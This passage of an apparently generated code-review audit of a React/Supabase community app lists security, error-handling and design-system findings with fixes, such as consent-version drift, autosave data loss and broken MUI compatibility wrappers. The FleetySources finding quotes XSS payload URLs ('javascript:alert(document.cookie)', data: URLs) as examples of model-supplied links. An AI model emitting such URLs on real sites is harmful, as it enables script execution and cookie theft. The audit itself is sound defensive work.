- **What breaks:** The signature query selects version_id (line 58) but alreadySigned = !!signature (line 99) ignores it entirely — it is never compared to the current version.id (line 43). When a NEW community agreement version is published (is_current flips to a new row), every previously-signed contributor is shown 'Signed on <date>' and is never asked to agree to the changed terms. They are gated-through on, and legally recorded against, terms that no longer match what is current — a silent consent-drift bug on the exact gate that governs training eligibility.
- **Smallest fix:** Compute alreadySigned as signature?.version_id === version?.id; when the signed version differs from current, re-render the agree UI for the new version instead of the 'Signed' state.
- _added-in-verification_

### [Medium] Sign RPC records against server-current version, not the version the user was shown (consent TOCTOU)  `error-handling` (CONFIRMED)
- **Where:** src/components/agreements/CommunityAgreementSheet.tsx:38-51 (version fetched, staleTime 60s), 74-77 (rpc call)
- **What breaks:** The displayed agreement body comes from a client query with staleTime 60_000, but sign_community_agreement is invoked with only p_application_id and p_user_agent (lines 75-76) — the version_id the user actually read is NOT passed. If is_current changes on the server between the sheet loading version A and the user clicking (or if the 60s-stale cache lags a rollover), the RPC binds the signature to whatever the server now considers current (version B) while the user read and consented to version A. The client cannot prove what was shown, and there is no compile- or run-time check that displayed==signed. On a legally binding consent gate this is a real integrity gap.
- **Smallest fix:** Pass the displayed version.id into the RPC and have sign_community_agreement reject (not silently reassign) when it does not match the server's current version, forcing a reload+re-read.
- _added-in-verification_

### [Medium] Autosave keeps the only draft copy in volatile memory — no durable fallback when the circuit opens  `error-handling` (CONFIRMED)
- **Where:** src/hooks/use-autosave.ts:103-104 (valueRef/lastSavedValueRef), 135-149 (openCircuit), 227-238 (beforeunload only)
- **What breaks:** Once the circuit opens, autosave hard-stops (flush returns early at line 153) and the unsaved edits exist ONLY in valueRef — the hook writes nothing to localStorage/IndexedDB at any point. The single protection against loss is the beforeunload prompt (lines 228-238), which the user can dismiss, and which does nothing on a tab crash, OS kill, or in-app route change that unmounts the form. So the failure mode the circuit is meant to survive (server can't save) is paired with zero durable local copy — the draft is one navigation away from gone, which is also what makes the Reload button in AutosaveCircuitBanner a data-loss trap. This is a systemic reliability gap behind several of the UI-level findings above.
- **Smallest fix:** On dirty/circuit-open, snapshot value to a namespaced localStorage/IndexedDB key and rehydrate on mount; only then is the banner's 'your typing is safe' copy true and Reload safe.
- _added-in-verification_

### [Low] Unvalidated dates render as 'Invalid Date' or throw to users  `error-handling` (PLAUSIBLE)
- **Where:** src/components/feedback/FeedbackDetailPanel.tsx:46 and src/components/agreements/CommunityAgreementSheet.tsx:133
- **What breaks:** format(new Date(feedback.created_at), 'PPpp') and format(new Date(signature!.signed_at), 'MMMM d, yyyy') assume well-formed timestamps. A null/malformed value yields new Date(NaN); date-fns format throws RangeError on an invalid date in current versions. In FeedbackDetailPanel this is inside render with no error boundary shown, so one bad row blanks the whole panel rather than that one field.
- **Smallest fix:** Guard with date-fns isValid and render a fallback ('Unknown') when the parsed date is invalid.

### [Low] Field-level errors not programmatically linked to their inputs  `under-engineering` (CONFIRMED)
- **Where:** src/components/general-application/SectionBasicInfo.tsx:43-47; SectionProfile.tsx:77,114,130,142,160; SectionEngagement.tsx:46-50,63-67
- **What breaks:** Error <p role="alert"> messages render but are not connected to their controls via aria-describedby/aria-errormessage. The hours_commitment (SectionBasicInfo:24-42) and previous_engagement (SectionEngagement:27-45) button groups set no aria-invalid and expose no error link at all; the country/timezone comboboxes set aria-invalid (SectionProfile:53,90) but the error <p> is never referenced; the goals textarea's aria-describedby points only to the count (SectionProfile:157), not the error. A screen-reader user who tabs back after a failed submit gets no announcement of why a field is invalid, so the gated application's required-field flow is effectively unusable non-visually.
- **Smallest fix:** Give each error a stable id and wire aria-describedby={errors.x ? id : undefined} on the matching input/combobox; set aria-invalid on the choice-button groups and link their error ids too.

---

## Quest, events, recruiting, profile, Fleety, auth & i18n components

### [High] QuestIntakeWizard writes the profiles table directly, bypassing ProfileService  `security` (CONFIRMED)
- **Where:** src/components/quest/QuestIntakeWizard.tsx:106-109
- **What breaks:** handleContinue calls supabase.from("profiles").update({ interests }).eq("user_id", user.id) straight from the UI. ProfileService (src/services/profile.service.ts) is verified to be the single write chokepoint: every write path there runs deepSanitize() and, in updateFields, pickAllowedFields() mass-assignment allow-listing. This component skips both, establishing a second write mechanism to the most sensitive table in the app. Interests here is a fixed enum so today's payload is safe, but the pattern is the vulnerability: the next engineer copies this line for a free-text field and unsanitized, mass-assignable data reaches profiles with only RLS as a backstop, while the two write paths' allow-lists silently diverge.
- **Smallest fix:** Add ProfileService.updateInterests(userId, interests) (running through deepSanitize like its siblings) and call that; forbid supabase.from("profiles").update in components via an arch-gate grep.

### [High] QuestIntakeWizard ignores the profiles update {error} — failed saves look successful  `error-handling` (CONFIRMED)
- **Where:** src/components/quest/QuestIntakeWizard.tsx:106-116
- **What breaks:** The update is awaited but its { error } result is never destructured or checked. supabase-js resolves (does not reject) on RLS/constraint/network failure, so the surrounding try/catch never fires for a DB-level failure — it only catches a thrown refreshProfile(). On any denied or dropped write the code proceeds to refreshProfile() and advances to the recommendations step as if the save succeeded: the member's interests are silently lost, recommended paths are computed from stale/empty interests, and no error toast appears. The try/catch gives false confidence.
- **Smallest fix:** const { error } = await supabase...; if (error) throw error; (or throw on the service's returned error) so the catch's toast.error actually runs on write failure.

### [High] FleetySources renders AI/RAG-supplied source URLs as raw hrefs with no protocol check (XSS)  `security` (CONFIRMED)
- **Where:** src/components/fleety/FleetySources.tsx:21-30 (dedupeSources: src/lib/fleety/sources.ts:33-43)
- **What breaks:** Each citation is rendered as <a href={url} target="_blank"> directly from the urls prop. Verified: dedupeSources only de-dups strings with zero protocol validation, and formatSourceLabel only computes display text, never gating the href. These URLs come from the model's X-Fleety-Sources metadata — retrieval over guide/handbook/project entities that can be user-influenced. A source of javascript:alert(document.cookie) or data:text/html,... is emitted verbatim as a clickable first-party link; one click is script execution or a phishing page in the app origin. The codebase already ships safeHref (src/lib/security.ts:76, which rejects everything except http/https/mailto) and SafeExternalLink for exactly this, and this component bypasses both.
- **Smallest fix:** Render each source through SafeExternalLink (or gate with safeHref before rendering) and drop items where safeHref returns undefined.

### [Medium] Project blast mass-email has no idempotency key — retries double-send to every applicant  `error-handling` (CONFIRMED)
- **Where:** src/components/recruiting/ProjectBlastComposer.tsx:84-129
- **What breaks:** handleSend invokes send-project-blast with { projectId, subject, bodyHtml } and no client-generated idempotency token. The only guards are the local `sending` flag and the confirm dialog — both reset on error. If the edge function sends the emails but the HTTP response is lost (timeout, network blip, cold-start 5xx), the catch shows "Couldn't send blast" and the admin naturally clicks Send again; every completed applicant receives a duplicate email and duplicate in-app notification, unrecoverably (the confirm copy itself says it can't be undone). At scale this is a mass duplicate-notification incident and a sender-reputation hit.
- **Smallest fix:** Generate a stable idempotencyKey (e.g. crypto.randomUUID persisted with the draft) and pass it in the invoke body; dedupe on it in the edge function.

### [Medium] Quest-completion business rule (isStepCompleted) lives in and is exported from a view file  `boundary` (CONFIRMED)
- **Where:** src/components/quest/QuestRoadmap.tsx:337-406
- **What breaks:** isStepCompleted decodes raw DB shapes (step_type, linked_table, linked_filter, status/applicant_status matching, submitted↔completed equivalence) to decide whether each quest step is done — a multi-branch business rule. It is exported from QuestRoadmap.tsx and imported by four call sites (QuestPathDetail.tsx:12, ControlCenterOverview.tsx:14, QuestDetailPage.tsx:15, plus QuestRoadmap itself), coupling all of them to a sibling UI file and fusing decision logic with rendering. The submitted-also-matches-completed rule is duplicated across the application-branch's general_applications and project_applications cases (lines 383-384 and 395-396) and can drift. Completion is computed purely client-side from sysVerification arrays, so the client is the sole arbiter of "done" for display; if any gating ever keys off it, it is trivially spoofable.
- **Smallest fix:** Move isStepCompleted into quest.service.ts (or a lib/quest module) as the single owner; import it from there into all four sites, collapse the duplicated submitted/completed branch, and validate any consequential completion server-side.

### [Medium] QuestDetailPage calls isStepCompleted without sysVerification — system-verified/application steps never count as done  `boundary` (CONFIRMED)
- **Where:** src/pages/QuestDetailPage.tsx:48
- **What breaks:** This call passes only four args — isStepCompleted(s, allProgress, selfReportProgress, profile) — omitting the fifth sysVerification argument that the QuestRoadmap/QuestPathDetail/ControlCenterOverview call sites all pass. Verified against the signature (QuestRoadmap.tsx:337-343): with sysVerification undefined, every `system_verified` and `application` branch falls through to `return false`. So completedPathSlugs computed here silently under-counts: any path whose completion depends on a project/general application or class certification can never be marked complete on this page, and any prerequisite gating keyed off completedPathSlugs stays locked forever for those members. This is the exact drift the boundary finding warns about, now a live bug — a direct consequence of the rule living in a shared UI file with a five-positional-arg signature.
- **Smallest fix:** Thread sysVerification (useSystemVerificationData) into this call; better, move isStepCompleted behind a service function whose signature can't be under-applied.
- _added-in-verification_

### [Medium] CompletenessMeter swallows its fetch error and reaches into Supabase directly instead of a hook  `error-handling` (CONFIRMED)
- **Where:** src/components/profile/CompletenessMeter.tsx:42-73
- **What breaks:** The component fetches v_profile_readiness via a bare supabase.from(... as never).select().maybeSingle() inside a useEffect, and the catch does nothing but setLoading(false); the maybeSingle {error} field is also discarded. Any failure (RLS change, view rename, network) makes the meter render null with no report, no retry, no telemetry — the completeness prompt just vanishes and no one knows why. It also bypasses the react-query layer the rest of the app uses (see ProjectBlastHistory/EventsSyncHealthBanner), so no caching, refetch-on-every-mount, and an `as never` type escape hatch.
- **Smallest fix:** Move the query into a useQuery-based useProfileReadiness hook that surfaces isError and reports failures; remove the empty catch.

### [Medium] TurnstileChallenge render effect depends on onTokenChange identity — an unmemoized prop remounts the widget and wipes the token  `boundary` (PLAUSIBLE)
- **Where:** src/components/auth/TurnstileChallenge.tsx:161-231
- **What breaks:** The widget-render useEffect lists onTokenChange in its deps (line 231), and its cleanup calls window.turnstile.remove(widgetId) and onTokenChange(""). If the parent auth form passes an inline (non-memoized) onTokenChange — the common React default — every parent re-render changes its identity, tearing down and re-rendering the Turnstile widget and clearing the just-solved token. The user watches the challenge flicker/reset and their token disappears right as they submit, producing spurious "complete the human verification" failures on the very login path this file's incident comments (captcha-transient-lockout-2026-08) are fighting. Marked PLAUSIBLE because it hinges on the caller not stabilizing the handler, which I did not read.
- **Smallest fix:** Store onTokenChange in a ref updated in its own effect and drop it from the render effect's deps, keying the render/remove lifecycle only on action + scriptReady; or require a useCallback-stabilized handler.

### [Medium] QuestExploreDialog shows a prerequisite lock but the Add action is never gated on it  `under-engineering` (CONFIRMED)
- **Where:** src/components/quest/QuestExploreDialog.tsx:72-110
- **What breaks:** prereqsMet/missingPrereqs are computed and a Lock icon + "Requires: …" is shown, but the Add button is disabled only by addPath.isPending (line 105), never by !prereqsMet. A member can add an advanced path with unmet prerequisites in one click, contradicting the UI's own lock affordance; if useAddQuestPath doesn't independently enforce prerequisites server-side, path ordering is bypassed and the lock is pure theater. Separately, handleAdd (line 41-43) awaits mutateAsync with no try/catch, so a rejected mutation is an unhandled promise rejection unless the hook fully owns the error and never rethrows.
- **Smallest fix:** disabled={addPath.isPending || !prereqsMet} on the Add button, confirm the quest service rejects adds with unmet prerequisites, and wrap handleAdd's await so failures surface a toast.

### [Low] Multiple UI components query Supabase directly, bypassing the hooks/service layer  `dependency` (CONFIRMED)
- **Where:** src/components/recruiting/ProjectBlastComposer.tsx:47-59, src/components/recruiting/ProjectBlastHistory.tsx:29-45, src/components/events/EventsSyncHealthBanner.tsx:33-44
- **What breaks:** Each embeds table/column/RPC knowledge inline in a component: project_applications count filtered on status=completed, project_blasts history column list, and the get_community_events_health RPC shape. The intended layering is UI -> data hooks -> services; spreading data-access across JSX means a table/column/RLS change lands in scattered view files instead of one hook, and the query shapes can't be reused or unit-tested without rendering. This is the drift toward N copies of the same query.
- **Smallest fix:** Extract each into a named react-query hook (useProjectApplicantCount, useProjectBlasts, useCommunityEventsHealth) under src/hooks and consume those.

### [Low] FleetyMessageFeedback keeps optimistic selection after a failed write and awaits lib calls without try/catch  `error-handling` (CONFIRMED)
- **Where:** src/components/fleety/FleetyFeedback.tsx:21-36
- **What breaks:** rate() and toggleReason() set local state optimistically then await submitRating/submitReasons. On { ok: false } they toast an error but never revert setRating/setReasons — the thumb stays lit and the reason chip stays selected, telling the member their feedback was saved when it wasn't; on remount it disappears, so UI and DB disagree. And these awaits have no try/catch, so if the lib throws rather than returning { ok:false }, the rejection is unhandled and no toast fires at all.
- **Smallest fix:** On failure roll back to the previous rating/reasons value, and wrap the awaits so a thrown error also surfaces the toast.

### [Low] AvatarCropperDialog swallows crop/encode/upload failures with no user-facing feedback  `error-handling` (CONFIRMED)
- **Where:** src/components/profile/AvatarCropperDialog.tsx:45-54
- **What breaks:** handleConfirm uses try/finally with no catch. renderCrop can reject (canvas unavailable — thrown at line 113, toBlob null — line 122, or cross-origin image load failure — line 133), and onConfirm (the upload) can reject; either propagates as an unhandled rejection while the dialog just flips saving off and stays open with no message. The user clicks Save, nothing visibly happens, and they can't tell whether the photo saved. Error reporting is entirely delegated to an unseen caller with no contract enforcing it.
- **Smallest fix:** Add a catch that surfaces a toast/inline error (distinguishing encode failure from upload failure) before the finally resets saving.

### [Low] pathBySlug map rebuilt inline in several components despite the useQuestPathMaps helper  `under-engineering` (CONFIRMED)
- **Where:** src/components/quest/QuestRoadmap.tsx:216-220 (PathCard), src/components/quest/QuestIntakeWizard.tsx:269-273 (RecommendedPathCard), src/components/quest/ControlCenterOverview.tsx:83-88
- **What breaks:** useQuestPathMaps(paths) (src/lib/quest/path-maps.ts) exists and returns byId/bySlug, and several call sites use it — but PathCard, RecommendedPathCard, and ControlCenterOverview hand-roll their own `new Map<string, QuestPath>()` slug lookups again. Duplicated construction means the keying/memoization strategy lives in N places and a change or bug in one copy silently diverges from the shared helper. Pure maintenance drift, but it is the rewrite-what-exists pattern the rules call out.
- **Smallest fix:** Use the bySlug map from useQuestPathMaps everywhere instead of rebuilding local maps (note PathCard/RecommendedPathCard receive allPaths as a prop, so pass or derive the shared map instead).

### [Low] ProjectBlastComposer's displayed applicant count and the edge function's actual recipient set can silently disagree  `under-engineering` (PLAUSIBLE)
- **Where:** src/components/recruiting/ProjectBlastComposer.tsx:47-59, 87-89, 210
- **What breaks:** The composer computes applicantCount client-side as project_applications where status=completed and both the inline warning and the confirm dialog assert "This will reach N applicants" / "Send blast to N applicants?". The edge function independently decides who actually receives the blast from { projectId } alone. If the two selection rules ever differ (a different status filter, notification opt-outs, dedupe), the admin confirms a number that doesn't match reality — under- or over-sending with a confirmation that misrepresents the blast radius. The recipient set has one true owner (the edge function); duplicating a second definition of it in the UI invites drift.
- **Smallest fix:** Have the edge function (or a shared RPC) return the authoritative recipient count and drive the warning/confirm copy from that single source rather than a UI-side status filter.
- _added-in-verification_

---

## shadcn UI primitives & component tests

### [High] Four rival SaveStatus components ship at once; the "consolidation" molecule never replaced the legacy three  `ownership` (CONFIRMED)
- **Where:** src/design-system/components/molecules/SaveStatus.tsx:2-3 (claims it "consolidates the three legacy save-status components") vs still-live src/components/ui/AutosaveStatus.tsx, src/components/ui/SaveStatus.tsx, src/components/ui/save-status.tsx
- **What breaks:** There is no single owner of "how a save-state looks/reads." The canonical molecule is used only in one test (phase3d.test.tsx) and the design-system barrel; every real page still imports a legacy variant (AutosaveStatus in ClassFormPage, CohortFormPage, ProjectFormPage, ProjectApplicationPage, BannerManagementPage, ClientsTab; save-status in WelcomeWizard). The four render different DOM, colors, tones and even different state vocabularies (molecule/ui-SaveStatus expose message, ui-save-status/AutosaveStatus expose onRetry). Same concept, four sources of truth that drift independently and can never be fixed in one place. Note: added-in-verification.
- **Smallest fix:** Pick the molecule as the one owner, migrate all page imports to it, then delete AutosaveStatus.tsx, SaveStatus.tsx and save-status.tsx. Wire an eslint no-restricted-imports rule so the legacy paths can't come back.

### [High] src/components/ui/SaveStatus.tsx and save-status.tsx collide on case-insensitive Windows/macOS filesystems  `other` (CONFIRMED)
- **Where:** src/components/ui/SaveStatus.tsx and src/components/ui/save-status.tsx (same directory, names differ only in case); consumer src/pages/WelcomeWizard.tsx:20 `import { SaveStatus, type SaveState } from "@/components/ui/save-status"`
- **What breaks:** Two files whose paths differ only by case cannot both materialize in a standard Windows/NTFS or macOS checkout — git core.ignorecase makes one silently clobber the other on clone. The two files export incompatible shapes: save-status.tsx exports `SaveState` + `onRetry`; SaveStatus.tsx exports `SaveStatusState` + `message` and no `onRetry`. If the module resolver or checkout lands on SaveStatus.tsx, WelcomeWizard's `type SaveState` import fails to compile and `<SaveStatus state=... savedAt=... />` is fed a component with different prop semantics. This repo is on Windows, so this is a live hazard, not theoretical. Note: added-in-verification.
- **Smallest fix:** Eliminate the collision by deleting both legacy files as part of the consolidation above; if one must survive temporarily, rename so no two files in the tree differ only by case, and add a CI check (e.g. `git ls-files | sort -f | uniq -Di`) that fails on case-only collisions.

### [Medium] translator-race test asserts the production bug is fixed but never simulates the translator, so it passes vacuously  `other` (CONFIRMED)
- **Where:** src/components/ui/__tests__/AutosaveStatus.translator-race.test.tsx:26-40 ("cycles idle → saving → saved → error without throwing")
- **What breaks:** The test's stated purpose is to prove re-renders never throw `NotFoundError: removeChild` — the real System-Health regression (see src/lib/i18n/dom-translator.ts:83). But it only does plain React `rerender()` calls with no DOM translator mounted and no external text-node mutation. Plain React rerenders never throw that error, so the test is green whether or not the four-key skip contract actually protects the aria-live region. If someone removes `data-no-translate`/`translate="no"`/`role`/`aria-live` from AutosaveStatus, the first test (which checks the attributes) fails but this "never throws" test still passes — giving false confidence that the race is covered. The regression it names cannot be caught here. Note: added-in-verification.
- **Smallest fix:** Drive the actual dom-translator (installDomTranslator) against the rendered pill, or a MutationObserver that rewrites text nodes on each state flip, and assert no error AND that the pill's text was left untouched (skip contract honored). Otherwise rename the test so it doesn't claim to cover the removeChild race.

### [Medium] "Saved N ago" relative-time formatting is copy-pasted four times with divergent thresholds and one missing invalid-date guard  `ownership` (CONFIRMED)
- **Where:** AutosaveStatus.tsx:18-25 relativeLabel; SaveStatus.tsx:43-53 formatRelative; save-status.tsx:28-37 relativeTime; design-system/.../molecules/SaveStatus.tsx:37-40
- **What breaks:** Four independent implementations of the same user-facing fact. They already disagree: AutosaveStatus falls back to `toLocaleTimeString` after 1h and shows `Ns`/`Nm`; SaveStatus shows `N min ago`/`Nh`/`Nd`; save-status shows `Nm`/`Nh` then `toLocaleDateString`; the molecule ignores elapsed time entirely and always prints `at HH:MM`. So the same save renders a different label depending on which duplicate a page happened to import. Worse, the molecule does `new Date(savedAt).toLocaleTimeString()` with no NaN guard, while SaveStatus.tsx has a `toDate`/`Number.isNaN` guard — a malformed `savedAt` renders "Saved at Invalid Date" in the molecule only. Note: added-in-verification.
- **Smallest fix:** Extract one `formatSaveTime(date)` helper (with the NaN guard) into src/lib and have the single surviving SaveStatus component call it; delete the other three copies along with their host components.

---

## Design system: atoms

### [High] Avatar compat shims render image AND fallback simultaneously and kill all image-load-error fallback  `under-engineering` (CONFIRMED)
- **Where:** src/design-system/components/atoms/Avatar.tsx:11-25
- **What breaks:** MuiAvatar (line 11-13) is never given a `src`/`srcSet`, so MUI's entire image-management path is dead. The documented compat pattern <Avatar><AvatarImage src/><AvatarFallback>JD</AvatarFallback></Avatar> passes both shims as children: AvatarImage (16-20) renders a raw <img> and AvatarFallback (23-25) renders a bare fragment. MUI just renders both children, so the image element and the 'JD' initials paint at the same time, overlapping. Because MUI controls no src, its swap-to-initials-on-404/slow logic never runs — a dead or slow avatar URL shows the browser broken-image glyph next to the initials. Across a 767-user roster/profile UI, every avatar with a broken or slow URL renders visibly broken.
- **Smallest fix:** Make the shims real: have AvatarImage lift its src/srcSet/onError onto the parent MuiAvatar (or collapse to native <Avatar src alt>{initials}</Avatar>, which shows children only when the image fails). An <img> with onError that hides itself, or lifting src to the Avatar, restores fallback-on-error.

### [High] Slider/Toggle/RadioGroup/Checkbox/Switch never shim the shadcn handler divergence — migrated change handlers silently never fire  `under-engineering` (CONFIRMED)
- **Where:** src/design-system/components/atoms/Slider.tsx:9-11; Toggle.tsx:13-18; RadioGroup.tsx:10-12; Checkbox.tsx:8-13; Switch.tsx:8-10
- **What breaks:** shadcn used onValueChange/onPressedChange/onCheckedChange; MUI uses onChange. Every wrapper just spreads {...props} into the MUI component and adapts nothing. An unknown function prop like onValueChange is not a MUI event, so MUI forwards it toward the DOM where React drops it (with a warning) and the handler is NEVER invoked. Result: a Slider, Toggle, RadioGroup, Checkbox, or Switch that renders and visually toggles but whose state callback never runs — forms that look interactive but never update their model, surfacing only as a control that 'doesn't save'. Note the divergence is only 'documented' in Slider/Toggle/RadioGroup headers; Checkbox and Switch headers do not even mention it, so the trap is entirely invisible there. Contrast Avatar and Button.asChild, which DID get shims — the compat policy is applied inconsistently, so which breaking changes are handled is a coin flip.
- **Smallest fix:** Add real compat props (accept onValueChange/onPressedChange/onCheckedChange and adapt to MUI's onChange(event,value) inside each wrapper), or delete the misleading NOTEs and enforce the MUI handler name via a codemod/lint rule so no caller can pass the dead prop.

### [Medium] Many atom wrappers are plain function components that swallow refs  `under-engineering` (CONFIRMED)
- **Where:** src/design-system/components/atoms/Slider.tsx:9; RadioGroup.tsx:10; ToggleGroup.tsx:9; Separator.tsx:7; Skeleton.tsx:7; Progress.tsx:12; AspectRatio.tsx:12
- **What breaks:** These wrap MUI in a bare `function X(props){ return <Mui {...props}/> }` with no forwardRef, while sibling atoms (Button, Input, Checkbox, Switch, Toggle, Text) correctly use forwardRef and others (Radio.tsx:7, Chip, Fab) use the ref-preserving re-export form. A caller doing <Slider ref={r}>, react-hook-form's Controller attaching a field.ref, or any focus-management code gets React's 'Function components cannot be given refs' warning and a null ref — silently dropped. For form controls like Slider this breaks RHF registration and programmatic focus, and the inconsistency means callers cannot rely on any atom accepting a ref.
- **Smallest fix:** Wrap each in forwardRef and pass ref through, or where it is a trivial passthrough use the `export { default }` re-export form (like Radio/Chip/Fab) which preserves MUI's own ref forwarding.

### [Medium] InputOTP atom re-exports from the legacy @/components/ui layer it is meant to replace  `dependency` (CONFIRMED)
- **Where:** src/design-system/components/atoms/InputOTP.tsx:8
- **What breaks:** `export * from "@/components/ui/input-otp"` inverts the intended dependency direction: the new design-system layer (superseder) depends on the old components/ui layer (superseded). The header admits teardown will rebuild input-otp — when that happens this atom's import target vanishes and every design-system consumer of InputOTP breaks at build time. The `export *` also re-exports whatever internals that legacy file happens to expose, so the atom has no controlled public surface and drifts whenever the legacy file changes. OTP entry is on auth/verification flows, so a broken build here blocks logins. (Confirmed the legacy target src/components/ui/input-otp.tsx currently exists — the dependency is live, not yet broken.)
- **Smallest fix:** Pin an explicit named re-export (export { InputOTP, ... }) so the public surface is controlled, and track the legacy file's teardown as a hard dependency (fail CI if the target is removed) rather than a follow-up.

### [Medium] Button asChild overwrites the child's event handlers instead of merging them  `under-engineering` (CONFIRMED)
- **Where:** src/design-system/components/atoms/Button.tsx:65-77
- **What breaks:** asChild spreads {...slotProps} (child props, line 70) then {...props} (Button props, line 71), so on any key collision the Button wins and the child's value is discarded. Radix's Slot — the pattern this replaces — MERGES handlers (invokes both). Here <Button asChild onClick={a}><Link onClick={track} to=…>…</Link></Button> silently drops the Link's `track` and runs only `a`. className is special-cased and merged (62-64), but event handlers and style are not — so analytics/telemetry clicks attached to the inner Link vanish with no error, exactly where migration reviewers won't look.
- **Smallest fix:** Compose colliding function props (call child's then Button's) and merge style, mirroring Radix Slot semantics; or document loudly that asChild does not merge handlers and lint against passing handlers to both parent and child.

### [Medium] Button asChild also drops the child element's own ref  `under-engineering` (CONFIRMED)
- **Where:** src/design-system/components/atoms/Button.tsx:57-77
- **What breaks:** The asChild branch destructures only child.props (line 61) and forwards the Button's own `ref` to MuiButton. The child element's ref (child.ref) — e.g. <Button asChild><Link ref={navRef} to=…/></Button>, or a ref RHF/react-router attaches to the inner Link — is never read or re-attached, so it silently resolves to null. This compounds the handler-merge gap (finding 5): both the child's telemetry onClick and its ref are lost by the same shim, breaking focus management and any imperative access to the routed anchor with no error.
- **Smallest fix:** Merge refs in the asChild branch: read child.ref and compose it with the Button's ref (a mergeRefs util or callback ref) before passing to MuiButton, mirroring Radix Slot's ref composition.

### [Low] Checkbox/Switch forwardRef typed as HTMLButtonElement but MUI attaches the ref to the inner <input>  `other` (CONFIRMED)
- **Where:** src/design-system/components/atoms/Checkbox.tsx:8; Switch.tsx:8
- **What breaks:** Both declare forwardRef<HTMLButtonElement, …> and pass ref straight to MuiCheckbox/MuiSwitch, but MUI wires the forwarded ref to the underlying <input type=checkbox>, an HTMLInputElement. Consumers who trust the type and call ref.current for button-only APIs, or branch on tagName/role, get a runtime mismatch the compiler swore couldn't happen — a type-lie that defeats the safety the ref typing is supposed to provide.
- **Smallest fix:** Type the ref as HTMLInputElement (the element MUI Checkbox/Switch actually forward to) so the declared type matches reality.

### [Low] Text default tag map emits two semantic <h1>s on any page using both display and pageTitle  `other` (CONFIRMED)
- **Where:** src/design-system/components/atoms/Text.tsx:39-51
- **What breaks:** BRAND_TO_TAG maps both display -> 'h1' (line 40) and pageTitle -> 'h1' (line 41, whose own comment says 'one <h1> per page'). A hero page using a `display` headline plus a `pageTitle` — a natural pairing the brand names invite — renders two <h1> elements, a WCAG/heading-outline defect that screen-reader and SEO both penalize. The default actively encourages the mistake; it is only avoided if every caller remembers to pass `as`.
- **Smallest fix:** Default only one brand to h1 (e.g. pageTitle -> h1, display -> a non-heading or an explicitly chosen tag), and/or add a dev-time guard/lint that flags multiple h1 brands rendered without an explicit `as` override.

### [Low] Progress forwards NaN straight through to MUI when value is NaN  `error-handling` (CONFIRMED)
- **Where:** src/design-system/components/atoms/Progress.tsx:13-17
- **What breaks:** The `value == null` guard (line 13) only catches null/undefined. A caller computing value from data (done/total with total 0, or a failed parseInt) that passes NaN hits Math.max(0, Math.min(100, NaN)) = NaN, handed to LinearProgress variant='determinate'. MUI renders a bar with a NaN transform — an invisible/garbage bar plus a console warning instead of a sane 0 or indeterminate spinner, on the unhappy data path.
- **Smallest fix:** Treat non-finite values as indeterminate: `if (value == null || Number.isNaN(value)) return <LinearProgress {...props}/>` before clamping.

### [Low] Slider value-shape divergence (shadcn number[] vs MUI) is only a NOTE, not handled  `under-engineering` (CONFIRMED)
- **Where:** src/design-system/components/atoms/Slider.tsx:2-5,9-11
- **What breaks:** The header notes shadcn used value: number[] while MUI uses number | number[], but the wrapper passes value through untouched. A mechanically migrated caller still passing a single-element array like value={[50]} gets a MUI Slider that reads the array as a RANGE and can render an extra thumb / range fill, silently turning a single-value control into a range control. Combined with the dropped onValueChange it is a doubly-broken migrated slider.
- **Smallest fix:** Normalize in the wrapper (unwrap length-1 arrays to a scalar) or provide an explicit compat prop, instead of relying on a comment the migrator must read and act on.

### [Low] Avatar wrapper never forwards an accessible label, so every fallback avatar is also unlabeled  `other` (PLAUSIBLE)
- **Where:** src/design-system/components/atoms/Avatar.tsx:11-25
- **What breaks:** The compat AvatarImage sets alt only on its inner <img> (line 18) and defaults it to "", and AvatarFallback (23-25) emits a bare fragment with no aria. The MuiAvatar container itself receives no `alt`/aria-label. On the (broken-image) fallback path the img is decorative-empty and the initials are just text, so screen readers announce bare initials or nothing meaningful for the user's identity — across the 767-user roster this is a systemic a11y gap layered on top of the visual breakage in finding 1.
- **Smallest fix:** Have the compat pattern lift alt onto the MuiAvatar and/or give the fallback an aria-label with the person's name, so the avatar is labeled whether the image loads or not.

---

## Design system: molecules

### [High] Collapsible is fully broken: content never opens and the trigger is a dead no-op  `under-engineering` (CONFIRMED)
- **Where:** src/design-system/components/molecules/Collapsible.tsx:11-17
- **What breaks:** Confirmed in code. `Collapsible` destructures nothing useful — it types `open?` but its param list is `{ children }`, so `open` is dropped and it renders a plain <div>. `CollapsibleContent` reads `open` from its OWN props (line 15), which a mechanically-migrated caller <Collapsible open={x}><CollapsibleContent/></Collapsible> never passes, so <Collapse in={undefined}> stays collapsed forever. `CollapsibleTrigger` returns <>{children}</> with zero toggle wiring. Every collapsible section (filters, FAQ, expandable panels) is stuck closed with a dead trigger.
- **Smallest fix:** Lift open/onOpenChange into a context in Collapsible, have CollapsibleTrigger toggle it, and have CollapsibleContent read `open` from context — matching the Popover/DropdownMenu context pattern in this same folder.

### [High] Accordion silently loses single-open exclusivity and controlled value tracking  `under-engineering` (CONFIRMED)
- **Where:** src/design-system/components/molecules/Accordion.tsx:13-14
- **What breaks:** Confirmed. `Accordion = ({children}) => <div>{children}</div>` drops shadcn's type/value/collapsible/onValueChange entirely. `AccordionItem` spreads props onto MUI Accordion (line 14), which manages its own independent expanded state. A section migrated as single-open now lets every panel open at once, and any controlled accordion silently stops functioning with no error.
- **Smallest fix:** Implement a context in Accordion that tracks open value(s) and enforces single vs multiple, and have AccordionItem consume it (expanded/onChange) instead of spreading raw MUI props.

### [High] Tabs renders a blank panel and no selected tab by default (uncontrolled)  `under-engineering` (CONFIRMED)
- **Where:** src/design-system/components/molecules/Tabs.tsx:31,65-68
- **What breaks:** Confirmed. `defaultValue = ""` (line 31) seeds internal state to "". Uncontrolled with non-empty trigger values, initial value "" matches no MUI Tab (MUI warns and shows no active indicator) and every TabsContent returns null because ctx.value "" !== any value (line 67). No tab looks selected and the panel area is empty until the user manually clicks — a regression from shadcn where the first tab was active on mount.
- **Smallest fix:** Default the internal value to the first TabsTrigger's value (or require defaultValue and warn if absent) so an uncontrolled Tabs mounts with a real selection.

### [High] Compound triggers clobber the wrapped element's existing onClick/hover/focus handlers  `under-engineering` (CONFIRMED)
- **Where:** src/design-system/components/molecules/DropdownMenu.tsx:42-47; Popover.tsx:39-45; HoverCard.tsx:47-60
- **What breaks:** Confirmed in all three. cloneElement injects `onClick` (DropdownMenu/Popover) and onMouseEnter/Leave/Focus/Blur (HoverCard) directly with no merge, overwriting any handler the child already had. A <Button onClick={track}> used as a trigger loses `track` and only opens the surface. Note the contrast: DropdownMenuItem (line 62-72) DOES correctly chain onClick then close — the triggers were written without that care.
